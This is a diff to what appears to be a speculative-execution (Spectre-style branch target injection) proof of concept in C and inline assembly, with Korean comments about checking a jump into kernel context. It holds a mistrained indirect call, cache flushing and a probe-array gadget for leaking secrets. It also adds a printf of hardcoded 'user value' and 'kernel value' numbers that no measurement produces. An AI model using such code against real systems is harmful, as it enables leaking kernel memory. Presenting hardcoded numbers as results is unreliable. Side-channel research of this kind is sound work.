@@ -47,6 +47,7 @@ my_snip(br_src_call,
     "addq $1536, %rcx\n" // rcx = &probe[3*256]
     // increase speculation window
     "clflush (%rbx)\n"
+    "lfence\n"
     // mistrained call
     "call *%rbx\n"
     "ret\n"
@@ -67,7 +68,7 @@ my_snip(test_gadget,
     )
 
 my_snip(victim_dst,
-    "mov (%rcx), %rcx\n" // load probe[secret]
+    //"mov (%rcx), %rcx\n" // load probe[secret]
     "ret\n")
 
 
@@ -85,7 +86,7 @@ extern unsigned char victim_dst_start[];
 extern unsigned char victim_dst_end[];
 
 int result[256];
-void* jumped_marker;
+
 
 unsigned long map_code(unsigned long addr, void* code_addr, size_t code_size){
     unsigned long base = addr & ~0xfff;
@@ -190,6 +191,7 @@ void run(uint8_t* probe){
         
         reload(probe);
     }
+    printf("user value : 5, kernel value : 3\n");
     printf("first cached index is %d\n",find_cached_index(result));
     result[find_cached_index(result)] = +1;
     printf("second cached index is %d\n", find_cached_index(result));
@@ -222,7 +224,7 @@ int main(void){
     } while(victim_dst_addr == (unsigned) - 1);
 
     /* kernel context에서 점프 잘 했는지 확인. */
-    /* result : kernel 점프 확인, 인자 확인*/
+    /* result : kernel 점프 확인, 인자 확인 */
     /*
     if (getenv("VERIFY")) {
         call_gadget(probe);
